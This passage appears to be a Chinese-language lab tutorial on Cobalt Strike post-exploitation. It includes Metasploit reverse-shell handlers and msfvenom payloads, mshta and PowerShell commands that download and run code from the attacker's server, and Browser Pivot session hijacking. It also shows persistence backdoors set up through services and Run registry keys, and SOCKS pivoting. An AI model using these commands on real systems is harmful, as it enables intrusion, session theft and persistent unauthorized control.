alt></p><p>Session 会话管理，删除，心跳时间，退出，备注。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624212654228.png" alt></p><p>很多常用功能在view里选中够都能直接使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications 用于显示System Profiler获取的目标浏览器，操作系统，flash版本</span><br><span class="line">Credentials 显示所有已经获取的用户主机hash</span><br><span class="line">Downloads 显示下载的文件</span><br><span class="line">Event log 事件日志记录团队 目标上线等记录</span><br><span class="line">Keystrokes 目标键盘记录</span><br><span class="line">Proxy Pivots 代理信息</span><br><span class="line">Screenshots 屏幕截图</span><br><span class="line">Script Console 加载自定义脚本</span><br><span class="line">Targets 显示所有主机</span><br><span class="line">Web log  web服务日志</span><br></pre></td></tr></table></figure><p>这些选项直接打开是没有用的，得在beacon中执行相应命令后才能使用。</p><h4 id="与msf交互派生shell"><a href="#与msf交互派生shell" class="headerlink" title="与msf交互派生shell"></a>与msf交互派生shell</h4><p><strong>一、Cobalt strike派生shell给metasploit</strong></p><p>首先在metasploit处创建一个handler (Metasploit的exploit/multi/handler模块是一个有效负载处理程序,它只处理在受损主机中执行的有效负载连接。</p><p>在kali中执行“msfconsole”，启动metasploit。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625202014366.png" alt></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625202103140.png" alt></p><p>启动后输入如下图命令，用于在metasploit处创建一个handler。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 172.16.12.135</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625202848116.png" alt></p><p>接下来使用cobaltstrike创建一个listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625203014797.png" alt></p><p>启动cobaltstrike</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625203909870.png" alt="image-20200625203909870"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204106793.png" alt="image-20200625204106793"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204215728.png" alt="image-20200625204215728"></p><p>新建监听</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204351548.png" alt="image-20200625204351548"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204603432.png" alt="image-20200625204603432"></p><p>先生成恶意文件，注意，这里是针对test这个listenr，不要搞错了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204759067.png" alt="image-20200625204759067"></p><p>然后web driver by-&gt;host file</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204937547.png" alt="image-20200625204937547"></p><p>点击launch即可,切换到win7靶机，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.137:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p>切回kali，可以看到靶机已上线：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205245503.png" alt="image-20200625205245503"></p><p>下一步派生会话</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205414116.png" alt="image-20200625205414116"></p><p>选择msf的listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205559497.png" alt="image-20200625205559497"></p><p>此时就拿到了meterpreter</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625210340348.png" alt="image-20200625210340348"></p><p><strong>二、metasploit派生会话给Cobaltstrike</strong></p><p>cobalt派生shell给metasploit，同样的，metasploit也可以派生shell给cobalt strike。</p><p>首先在cobaltstrike创建一个listenr，等会用于接收msf派生的shell：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625210741841.png" alt="image-20200625210741841"></p><p>接下来启动msf,通过msf得拿到meterpreter。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先用msfvenom生成恶意文件:</span><br><span class="line">msfvenom  -p  windows&#x2F;meterpreter&#x2F;reverse_tcp  lhost&#x3D;172.16.12.135  lport&#x3D;4444  -f  exe  -o  test.exe</span><br><span class="line">然后开启监听:</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625211533398.png" alt></p><p>将生成的test.exe拷到win7靶机中，进行执行，获取到meterpreter</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625212312077.png" alt="image-20200625212312077"></p><p> 将其切换到后台，然后使用下面的模块，功能是注入一个新的payload 到当前的session里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625212516697.png" alt="image-20200625212516697"></p><p>设置其他选项，这里的payload设置为reverse_http，是因为前面cobalt strike的也是reverse_http,lport也要和CS的相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost 172.16.12.137（cobaltatrike IP）</span><br><span class="line">set lport 5555 （cobaltstrike监听端口）</span><br><span class="line">set seesion 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625214105555.png" alt="image-20200625214105555"></p><p>然后执行</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625214203173.png" alt="image-20200625214203173"></p><p>此时cobaltstrike拿到了metasploit派生的shell了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625214239474.png" alt="image-20200625214239474"></p><h4 id="AggressorScript"><a href="#AggressorScript" class="headerlink" title="AggressorScript"></a>AggressorScript</h4><p><strong>一、简介</strong></p><p>CobaltStrike强大的可扩展性注定了它在渗透工具中的地位，这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。</p><p>直接从拿到beacon开始:</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625221314363.png" alt="image-20200625221314363"></p><p>从GitHub clone第三方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;harleyQu1nn&#x2F;AggressorScripts.git</span><br></pre></td></tr></table></figure><p>Cobalt strike-&gt;script manager</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625221902177.png" alt="image-20200625221902177"></p><p>比如导入一个processcolor.cna，下图的ready打钩就说明导入成功可以使用了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222026863.png" alt="image-20200625222026863"></p><p>使用ps命令看下效果，不同的进程会显示不同的颜色：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222247314.png" alt="image-20200625222247314"></p><p>导入RedTeamRepo.cna试下：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222348361.png" alt="image-20200625222348361"></p><p>用法如下</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222532884.png" alt="image-20200625222532884"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222555218.png" alt="image-20200625222555218"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222626311.png" alt="image-20200625222626311"></p><p>这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。 Sleep基本上是一种在JVM上运行的类似Perl的语言。</p><p>在cs中view-&gt;script console，打开script控制台之后与其进行交互，我们可以在这儿跟踪，配置，调试和管理脚本。输入help可以查看帮助</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222823103.png" alt="image-20200625222823103"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222923820.png" alt="image-20200625222923820"></p><p>具体的参数及用法如下表所示</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625223027582.png" alt="image-20200625223027582"></p><p>首先以helloword为例，写一个完整的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先用subhello&#123;&#125;创建一个名为hello的函数</span><br><span class="line">然后打印消息到控制台println(“hello world!”);</span><br></pre></td></tr></table></figure><p>注意语句使用分号结尾，并且必须在调用函数之前定义函数。因为hello不接收任何参数，所以直接使用hello()调用。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224251376.png" alt></p><p>使用load加载cna脚本所在位置</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224501743.png" alt></p><p>也可以直接在脚本窗口使用一句话实现这个功能：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224733048.png" alt></p><p>输出我们已经学会了，那么我们可以输入吗？我们接下来要实现能够输出hello,xx的功能。</p><p>需要使用command关键字注册命令，这样我们就可以允许脚本通过控制台从用户接收触发器。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625225006780.png" alt></p><p>这段代码注册命令hello，脚本控制台会自动解析命令的参数。加载测试看看：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625225130272.png" alt="image-20200625225130272"></p><p>使用hello命令，传入mys3t，打印出了hello mys3t，实现了与cs的交互功能。</p><p><strong>二、sleep语言中的各种数据类型以及如何使用</strong></p><p> Sleep中的数据类型主要是字符串，数组和hash，字符串用$表示，数组用@表示，hash用％表示。</p><p>字符串包含字符或字符串; 数组可以包含多个字符串、数组或hash（可以在数组中混合类型）; 和散列包含多个键值对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">e $string &#x3D; &quot;This is a string.&quot;;</span><br><span class="line">e @array &#x3D; @(&quot;This first element.&quot;,2,$string);</span><br><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;vlaue&quot;,key2 &#x3D;&gt; @array,key3 &#x3D;&gt; $string);</span><br></pre></td></tr></table></figure><p>如何访问数组和hash中的数字。首先，数组中包含的数据可以通过其索引或其在数组中的位置来访问，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e @array &#x3D; @(&quot;First&quot;,&quot;Second&quot;,&quot;Third&quot;);</span><br><span class="line">x @array[0]</span><br><span class="line">x @array[1]</span><br></pre></td></tr></table></figure><p>还可以使用println直接打印这些值，”.”符号将两个值连接起来:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e println(&quot;The first value is:&quot;.@array[0]);</span><br></pre></td></tr></table></figure><p>  Hash也是类似的方式，不过使用的是键，而不是索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;value1&quot;,key2 &#x3D;&gt; &quot;value2&quot;,key3 &#x3D;&gt; &quot;value3&quot;);</span><br><span class="line">x %hash[&#39;key1&#39;]</span><br></pre></td></tr></table></figure><p>Cobalt Strike的核心是Cobalt Strike数据模型。 这是我们可访问的所有信息的地方，它为我们提供了大量数据，用于CobaltStrike中的自动化操作。 数据模型中收集的数据包括有关当前beacon的信息，从受感染系统收集的凭据，屏幕截图，下载的文件以及许多其他内容。</p><p>我们可以使用beacons()函数（Aggressor中的内置函数）获取所有当前连接的beacon的数组。 我们可以在脚本控制台中使用x beacons()查看此信息，我们会得到有关每个beacon的大量信息。 beacon以数组排列，每个beacon作为哈希存储在该数组中。 这就是数据模型中单个beacon的样子</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625230524018.png" alt="image-20200625230524018"></p><h2 id="Cobaltstrike钓鱼与劫持"><a href="#Cobaltstrike钓鱼与劫持" class="headerlink" title="Cobaltstrike钓鱼与劫持"></a>Cobaltstrike钓鱼与劫持</h2><h4 id="网站克隆劫持"><a href="#网站克隆劫持" class="headerlink" title="网站克隆劫持"></a>网站克隆劫持</h4><p>钓鱼攻击是社会工程学攻击的一种方式。钓鱼攻击使用电子邮件或者恶意网站引诱人们提供个人信息(用户名、密码、金融信息等)。</p><p>前提是靶机上线，在cs中获取靶机权限</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105102846.png" alt="image-20200627105102846"></p><p>选中会话后右键Interact,打开beacon console，为快速显示结果，将sleep设置为0</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105134958.png" alt="image-20200627105134958"></p><p>接下来克隆网站， Attacks-&gt;web driver by -&gt;clone site</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105345933.png" alt="image-20200627105345933"></p><p>  Clone url输入要克隆的网页的地址，Local port最好不要输80，避免冲突</p><p> 点击clone</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105435156.png" alt="image-20200627105435156"></p><p>接下来在win上输入上面给出的url，可以看到这是克隆了dvwa登录界面的钓鱼网页</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105513687.png" alt="image-20200627105513687"></p><p>输入用户名、密码，然后在cobaltstrike中调出web log</p><p>此处失败，没有成功获取web log里的密码。</p><h4 id="BrowserPivot"><a href="#BrowserPivot" class="headerlink" title="BrowserPivot"></a>BrowserPivot</h4><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。在实际的渗透过程中，用户登录的邮箱，后台管理以及其他的业务系统，也都可以利用此方法来进行登录，在远程用户没有察觉的情况下，获取到我们所需要的信息。 </p><p>前提依然是已经拿到靶机权限</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111454699.png" alt="image-20200627111454699"></p><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制。所以我们切换到windows上，打开IE浏览器访问dvwa。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111618860.png" alt="image-20200627111618860"></p><p>输入用户名、密码进入登录后的界面</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111822523.png" alt="image-20200627111822523"></p><p>接下来，通过Browser pivot来直接登录受害者登录的网站。</p><p> 操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用ps命令找到浏览器进程</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627111944827.png" alt="image-20200627111944827"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后注入进程，选中控制会话后右键explore-&gt;Browser Pivot</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627112058806.png" alt="image-20200627112058806"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627112213750.png" alt="image-20200627112213750"></p><p>选择一个后面打钩的,因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。Cobalt Strike也自动为我们选择了最佳的注入进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选中后点击launch</span><br></pre></td></tr></table></figure><p>此时在beacon shell中会显示http代理服务器的信息</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627113044989.png" alt></p><p>不设置代理的情况，kali上访问win上搭的dvwa，但是会自动跳转到下图的登录界面</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627114216896.png" alt="image-20200627114216896"></p><p>接下来打开kali上的火狐设置本地浏览器代理，在设置中找到network proxy，选择手动设置，设置为cs给出的地址和端口</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627120016695.png" alt="image-20200627120016695"></p><p>设置好后点击ok， 然后访问win中同样的网址http[:]//172.16.12.136/index.php,已经自动登录了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627120201199.png" alt="image-20200627120201199"></p><p> 要关闭代理的话可以输入命令browserpivot stop。</p><h2 id="Cobaltstrike权限维持"><a href="#Cobaltstrike权限维持" class="headerlink" title="Cobaltstrike权限维持"></a>Cobaltstrike权限维持</h2><h4 id="提权及spawn"><a href="#提权及spawn" class="headerlink" title="提权及spawn"></a>提权及spawn</h4><p>除了使用cs自带的提权exp进行提权，事实上我们可以使用外部准备好的exp来提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三方提权攻击库：ElevateKit</span><br><span class="line">下载到kali：git clone https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;ElevateKit.git</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627153234208.png" alt="image-20200627153234208"></p><p>选中后右键Interact，打开beacon console， 通过elevate-kit高效提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在beacon shell中输入elevate</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627153746186.png" alt="image-20200627153746186"></p><p>这是cs自带的, 接下来我们可以导入cna文件丰富我们的漏洞库</p><p> 点击左上角cobalt strike-&gt;script manager</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627153457951.png" alt="image-20200627153457951"></p><p> 点击load,找到下载的ElevateKit工具路径，选择cna文件</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627153526469.png" alt="image-20200627153526469"></p><p>通过右键-&gt;access-&gt;elevate</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627154926418.png" alt="image-20200627154926418"></p><p>点击launch，在beacon shell中会有回显信息</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627155017172.png" alt="image-20200627155017172"></p><p>根据回显可知已经提权成功</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627155046277.png" alt="image-20200627155046277"></p><p>派生场景：</p><p>假如你同事跟你说，他需要你那个目标的shell，但又不想直接连到你的团队服务器上。事实上，这个场景非常常见，cs针对这种场景的解决办法就是：让他直接在他本地起一个团队服务器创建个监听器，然后你再用你的cobaltstrike客户端连到他的团队服务器上，最后，把他要那个目标的shell派生到他指定的那个监听器上即可。</p><p>第一步，另开一台kali</p><p>在新开kali上启动teamserver：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627163733140.png" alt="image-20200627163733140"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627163937927.png" alt="image-20200627163937927"></p><p>然后在这台kali上启动一个客户端，这里的host是本地的，点击connect，进入后可以在下图可以看到此时是没有beacon的</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164255596.png" alt="image-20200627164255596"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164329043.png" alt="image-20200627164329043"></p><p>创建listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164442315.png" alt="image-20200627164442315"></p><p> 第二步，切换到第一台kali</p><p>在上一台已经拿到beacon的客户端上，创建新的连接，连接到172.16.12.135这台kali启动的teamserver上</p><p>点击左上角，cobalt strike-&gt;new connection</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164742511.png" alt="image-20200627164742511"></p><p>在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164900333.png" alt="image-20200627164900333"></p><p>切换至<a href="mailto:mys3t@172.16.12.137">mys3t@172.16.12.137</a>，选中一个beacon，右键spawn</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165033323.png" alt="image-20200627165033323"></p><p>  然后选中在172.16.12.135的cs客户端上创建的listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165115096.png" alt="image-20200627165115096"></p><p> 第三步，切换到172.16.12.135的cs客户端</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165231755.png" alt="image-20200627165231755"></p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。需要了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。</p><p><strong>一、设置powershell脚本开机自启动后门</strong></p><p>启动teamserver及客户端</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171252453.png" alt="image-20200627171252453"></p><p>点击Attacks-&gt;web driver-by -&gt;script web delivery</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171435897.png" alt="image-20200627171435897"></p><p>点击launch后出现如下</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171506690.png" alt="image-20200627171506690"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure><p>复制到靶机运行后：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171631310.png" alt="image-20200627171631310"></p><p>此时拿到了普通用户权限的beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627174534770.png" alt="image-20200627174534770"></p><p>打开becaon shell输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;TEST&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175322499.png" alt="image-20200627175322499"></p><p>切换到靶机，查看服务，输入services.msc命令即可,  在服务中找到了名为TEST的项</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627175439053.png" alt="image-20200627175439053"></p><p>此时启动类型还是手动，设置为自动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon  shell sc config &quot;TEST&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175557809.png" alt="image-20200627175557809"></p><p> 在服务中右键-》刷新，可以看到类型已经是自动了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627175648761.png" alt="image-20200627175648761"></p><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net start &quot;TEST&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175937521.png" alt="image-20200627175937521"></p><p>然后重启靶机，通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627180708776.png" alt="image-20200627180708776"></p><p><strong>二、通过service留自启动后门，生成一个exe后门</strong></p><p>Attacks-&gt;packages-&gt;windows executable</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628210956455.png" alt="image-20200628210956455"></p><p>然后右键explore&gt;file browser</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211202167.png" alt="image-20200628211202167"></p><p>把生成的exe程序上传到靶机</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211248927.png" alt="image-20200628211248927"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211640028.png" alt="image-20200628211640028"></p><p>  创建项及路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;server power&quot; binpath&#x3D; &quot;C:\test.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211758573.png" alt="image-20200628211758573"></p><p>设置服务的描述字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc description &quot;server power&quot; &quot;description&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211849270.png" alt></p><p> 设置服务为自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc config &quot;server power&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211945427.png" alt="image-20200628211945427"></p><p>在靶机的服务中可以看到server power的项</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628212055324.png" alt="image-20200628212055324"></p><p> 然后启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net start &quot;server power&quot;</span><br></pre></td></tr></table></figure><p>此时注意到又拿了一个beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628212123186.png" alt="image-20200628212123186"></p><p> 接下来还是重启靶机,重新获取控制。</p><p><strong>三、直接写注册表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="代理与C2"><a href="#代理与C2" class="headerlink" title="代理与C2"></a>代理与C2</h2><h4 id="代理和powershell"><a href="#代理和powershell" class="headerlink" title="代理和powershell"></a>代理和powershell</h4><p>代理（Proxy）也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。</p><p>在已拿到beacon情况下：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628223544318.png" alt="image-20200628223544318"></p><p><strong>利用socks代理客户端直接把各类渗透工具带进目标进网：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在beacon shell中输入socks 1234,1234为端口，我们可以随意设置，只要不冲突就行.</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628223827031.png" alt></p><p>接下来可以使用proxychains,它是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。</p><p>ProxyChains运行的所有配置都在/etc/proxychains.conf中，我们需要在这个文件中进行设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">在最后一行输入sosks4  127.0.0.1  1234</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224029301.png" alt="image-20200628224029301"></p><p> 设置好后，我们来看看proxychains使用代理访问的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令形式为：proxychains &lt;运行的命令&gt; &lt;命令参数&gt;</span><br></pre></td></tr></table></figure><p>比如我们可以把nmap代理到内网使用，用来扫描内网存活的主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在beaconshell中查看靶机ip</span><br><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224233528.png" alt></p><p>接下来就把nmap代理到这个网段进行扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sP 172.16.12.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224559889.png" alt="image-20200628224559889"></p><p>把其他工具代理到内网也是一样的道理。</p><p>把msf代理到内网可以使用这种办法，也可以直接利用隧道把整个msf带进目标内网：</p><p>点击cs菜单上的view-&gt;proxy pivots，可以看到代理情况</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628224734881.png" alt="image-20200628224734881"></p><p>然后点击下方的tunnel，复制命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:172.16.12.137:1234</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224839575.png" alt="image-20200628224839575"></p><p>启动msf</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225004839.png" alt="image-20200628225004839"></p><p>  把上一步复制的命令粘贴进来</p><p><img 